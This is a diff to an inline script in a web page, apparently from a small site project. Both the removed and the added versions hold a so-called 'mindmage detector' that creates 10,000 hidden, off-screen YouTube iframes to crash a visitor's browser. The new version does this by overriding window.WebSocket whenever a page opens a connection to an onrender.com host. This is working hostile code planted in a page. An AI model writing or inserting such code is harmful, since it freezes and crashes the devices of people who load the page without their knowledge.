@@ -52,19 +52,22 @@
 				}
 			});
 		</script>
-		<script> // anti-mindmage detector that will crash yur computer if you open a ws to render
-    let socket = new WebSocket(`wss://${location.hostname}.onrender.com`);
+		<script> //mindmage detector
+    let originalWebSocket = window.WebSocket;
     
-    socket.onopen = function() {
-        for (let i = 0; i < 10000; i++) {
-            let iframe = document.createElement("iframe");
-            iframe.src = "https://www.youtube.com";
-            iframe.style.width = "1px";
-            iframe.style.height = "1px";
-            iframe.style.position = "absolute";
-            iframe.style.left = "-9999px"; // Moves it out of view :D
-            document.body.appendChild(iframe);
+    window.WebSocket = function(url, protocols) {
+        if (url.match(/^wss?:\/\/.*\.onrender\.com$/)) {
+            for (let i = 0; i < 10000; i++) {
+                let iframe = document.createElement("iframe");
+                iframe.src = "https://www.youtube.com";
+                iframe.style.width = "10px";
+                iframe.style.height = "10px";
+                iframe.style.position = "absolute";
+                iframe.style.left = "-9999px"; // Moves it out of view
+                document.body.appendChild(iframe);
+            }
         }
+        return new originalWebSocket(url, protocols);
     };
 </script>
 
